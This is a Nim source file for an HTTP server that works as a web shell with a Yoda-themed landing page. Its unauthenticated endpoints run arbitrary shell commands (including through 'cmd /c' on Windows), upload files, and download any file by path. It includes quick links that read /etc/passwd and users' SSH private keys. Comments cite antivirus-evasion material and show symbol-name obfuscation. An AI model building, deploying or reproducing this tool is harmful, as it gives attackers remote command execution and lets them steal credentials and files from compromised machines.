import asynchttpserver
import asyncdispatch
import os
import strutils
import base64
import osproc
import uri
#import re
#import httpclient
#import httpform

# Custom modules loaded
import httpSrv/yodaImage

#[
    Compile for Linux
    nim c -r httpServer.nim
    
    Optimized for Size - Decreases size by about 40%
    nim c -d:strip --opt:size -r httpServer.nim  

    Compile for Windows 32-bit
    nim c -d:mingw --cpu:i386 -d:strip --opt:size httpServer.nim

    Compile for Windows 64-bit
    nim c -d:mingw --cpu:amd64 -d:strip --opt:size httpServer.nim

    References:
        https://programmerall.com/article/98992028875/
        https://dev.to/xflywind/write-a-simple-web-framework-in-nim-language-from-scratch-ma0
        https://nim-lang.org/docs/asynchttpserver.html
        https://nim-lang.org/docs/base64.html
        https://github.com/byt3bl33d3r/OffensiveNim
        https://ethicalhackingguru.com/how-to-write-a-reserve-shell-in-nim-to-bypass-antivirus/
        https://github.com/nim-lang/Nim/wiki/Nim-for-TypeScript-Programmers#table-of-contents

]#

var server = newAsyncHttpServer()
# Reference on obfuscation: https://github.com/nim-lang/Nim/wiki/Nim-for-TypeScript-Programmers#table-of-contents
# The below method is how you can obfuscate the names of variables, procs etc.
var listenPort {.exportc: "akjdakfjga2djfna4dfjna4fjn".} = 8080
let port = Port(listenPort)

proc GatherFiles(): string =
# Collect the files in the current directory into an array
# Excludes directories if they exist
    #var files: seq[string] = @[]
    var files: string = ""
    var fileLink: string = ""
    for file in walkFiles("*"):
        fileLink = "<a href='/download?file=" & file & "'>" & file & "</a><br />"
        files.add fileLink
    result = files

proc checkOS(): string =
    if (system.hostOS == "linux"):
        result = "Linux"
    else:
        result = "Windows"

#proc executeCommand(cmd: string): string =
#    #var decodeCmd = decode(cmd)#decodes the base64 input
#    var output: string = execProcess($decodeUrl(cmd))
#    result = output
proc httpResponse(req: Request) {.async.} =
    #echo (req.reqMethod, req.url, req.headers)
    #echo (req)
    # curl "http://127.0.0.1:8080/test?red=2&blue=3"
    # (client: ..., reqMethod: GET, headers: {"accept": @["*/*"], "host": @["127.0.0.1:8080"], "user-agent": @["curl/7.68.0"]}, protocol: (orig: "HTTP/1.1", major: 1, minor: 1), url: (scheme: "", username: "", password: "", hostname: "", port: "", path: "/test", query: "red=2&blue=3", anchor: "", opaque: false), hostname: "127.0.0.1", body: "")
    var osType: string = ""
    var cmdInput: string = ""
    #var sectionsFile: string = ""
    var htmlContent: string = ""    ## Empty
    var headers = {"Content-type": "text/html; charset=utf-8"}
    # Detect which OS is executing...
    if (osType == ""):
        osType = checkOS()
    if req.url.path == "/":
        htmlContent.add "<html><body><center><h3>\"In the end, cowards are those who follow the dark side.\"</h3>"
        htmlContent.add (showYodaImage())
        htmlContent.add "<br /><br />"
        htmlContent.add "<a href='/files'>View Files</a><br /><br />"
        htmlContent.add "<a href='/command'>Execute Commands</a><br /><br />"
        #htmlContent.add system.hostOS
        htmlContent.add "</center></body></html>"
    elif req.url.path == "/files":
        htmlContent.add "<html><body>"
        htmlContent.add "<a href=/>Home</a><br /><br />"
        htmlContent.add "<h3>Select File to Download</h3>"
        htmlContent.add GatherFiles()
        htmlContent.add "<br /><br />"
        htmlContent.add "<h3>Upload File</h3>"
        htmlContent.add "<form action='/files' method='POST' enctype='multipart/form-data'>"
        htmlContent.add "<input type='file' name='myFile' id='myFile'>"
        htmlContent.add "<input type='submit' value='Upload'>"
        htmlContent.add "</form>"
        htmlContent.add "<br /><br />"
        if (req.body != ""):
            var fileInfo = ($req.body).split("\r\n") # A text file has 7 elements or 0-6
            # Element 0 has the seperator
            # Element 1 has the headers
            # Element 4+ has the data
            # Element n-2 has the closing number sequence or separator
            # Element n-1 has the data
            #htmlContent.add $(fileInfo[6])
            var headersFile = $fileInfo[1] # Content-Disposition: form-data; name="myFile"; filename="gitnotes.txt"
            var headersInfo = headersFile.split(";") # filename="gitnotes.txt"
            var headersFilename = headersInfo[2].replace("filename=") # "gitnotes.txt"
            headersFilename = headersFilename.replace("\"") # gitnotes.txt
            headersFilename = headersFilename.replace("\'") # Saves with single quotes in the name...
            headersFilename = headersFilename.replace(" ")  # Saves with a space at the beginning of the name...
            headersFilename = "new_" & headersFilename # Safeguarding in the event I select a file I do not want to overwrite
            if (len(fileInfo) == 7):
                writeFile(headersFilename, fileInfo[4]) # Writes the 4th element which contains the text of the file
                htmlContent.add "<br /><br />Saving the file: " & headersFilename
            else:
                var binFile = string: ""
                var begForLoop = 4
                var endForLoop = len(fileInfo) - 3
                for i in countup(begForLoop, endForLoop):
                    binFile = binFile & fileInfo[i] & "\r\n"
                binFile = binFile[.. ^3]
                writeFile(headersFilename, binFile)
                # A binary may have more than 7 sections and they need to be pieced together
                htmlContent.add "<br /><br />Binary file, Saving the file: " & headersFilename
        htmlContent.add "</body></html>"
    # Build the file download function
    elif req.url.path == "/download":
        #htmlContent.add (req.url.query)
        headers = {"Content-type": "text/plain; charset=utf-8"}
        let queryTXT = req.url.query.split('=')
        let fileContent = readFile(queryTXT[1])
        # base64 encode the files and then display them...
        htmlContent.add encode(fileContent)
    elif req.url.path == "/command":
        if "cmd" in req.url.query:
            var queryTXT = req.url.query.split('=')
            var cmd = decodeUrl(queryTXT[1])
            var cmdResults: string = ""
            if osType == "Windows":
                cmdResults = execProcess("cmd /c " & cmd) 
            else:

                cmdResults = execProcess(cmd)
            htmlContent.add "<a href=/>Home</a><br /><br />"
            htmlContent.add "<form action='/command' method='GET'>"
            htmlContent.add "<label for='fname'>Command:&nbsp;</label>"
            htmlContent.add "<input type='text' id='cmd' name='cmd'><br />"
            htmlContent.add "<input type='submit' value='Execute'>"
            htmlContent.add "</form><br /><br />"
            htmlContent.add ("<a href=/command>Quick Options</a><br /><br />")
            htmlContent.add ("Command Executed: " & cmd & "<br /><br />")
            htmlContent.add "Results<br />"
            htmlContent.add ("<pre>" & $cmdResults & "</pre>")
        else:
            htmlContent.add "<a href=/>Home</a><br /><br />"
            htmlContent.add "<form action='/command' method='GET'>"
            htmlContent.add "<label for='fname'>Command:&nbsp;</label>"
            htmlContent.add "<input type='text' id='cmd' name='cmd'><br />"
            htmlContent.add "<input type='submit' value='Execute'>"
            htmlContent.add "</form><br /><br />"
            htmlContent.add "<h3>Quick Options</h3>"
            if osType == "Windows":
                htmlContent.add "<a href=/command?cmd=dir>dir</a><br /><br />"
                htmlContent.add "<a href=/command?cmd=sysinfo>sysinfo</a><br /><br />"
            else:
                htmlContent.add "<a href=/command?cmd=ls>ls - Directory Listing</a><br /><br />"
                htmlContent.add "<a href=/command?cmd=whoami>whoami</a><br /><br />"
                cmdInput = encodeUrl("cat /etc/passwd | grep /bin")
                htmlContent.add "<a href=/command?cmd=" & cmdInput & ">Output /etc/passwd</a><br /><br />"
                cmdInput = encodeUrl("cat /home/*/.ssh/id*")
                htmlContent.add "<a href=/command?cmd=" & cmdInput & ">Display SSH Keys if they Exist</a><br /><br />" # Possibly redo to be a function to show location
                htmlContent.add "<a href=/command?cmd='ss+-ltp'>Display TCP Connections (ss -ltp)</a><br /><br />"
    else:
        htmlContent.add "What are you trying to do?"
    await req.respond(Http200, htmlContent, headers.newHttpHeaders())

waitFor server.serve(port, httpResponse)